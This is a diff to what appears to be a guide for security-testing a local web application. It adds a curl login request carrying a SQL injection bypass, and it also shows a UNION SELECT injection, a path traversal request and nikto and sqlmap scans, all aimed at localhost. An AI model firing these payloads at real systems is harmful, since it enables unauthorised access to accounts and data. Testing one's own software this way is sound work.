@@ -76,6 +76,27 @@ curl -v "http://localhost:8080/?file=../boot.ini"
 ### SQL injection-like payloads
 
 ```bash
+curl 'http://localhost:8080/index' \
+  -X POST \
+  -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
+  -H 'Referer: http://localhost:8080/index' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Origin: http://localhost:8080' \
+  -H 'Connection: keep-alive' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'Sec-Fetch-Dest: document' \
+  -H 'Sec-Fetch-Mode: navigate' \
+  -H 'Sec-Fetch-Site: same-origin' \
+  -H 'Priority: u=0, i' \
+  --data-raw 'login=admin&password=%27+OR+%271%27%3D%271%27--&submit=Submit'
+```
+
+OR (pun intended)
+
+```bash
 curl -v "http://localhost:8080/search.php?q=1%27%20UNION%20SELECT%20NULL--"
 ```
 
@@ -94,6 +115,9 @@ Install basic testing tools and run quick scans against `localhost`.
 
 ```bash
 nikto -h http://localhost:8080
+```
+
+```bash
 sqlmap -u "http://localhost:8080/index.php?id=1" --batch --level=1
 ```
 
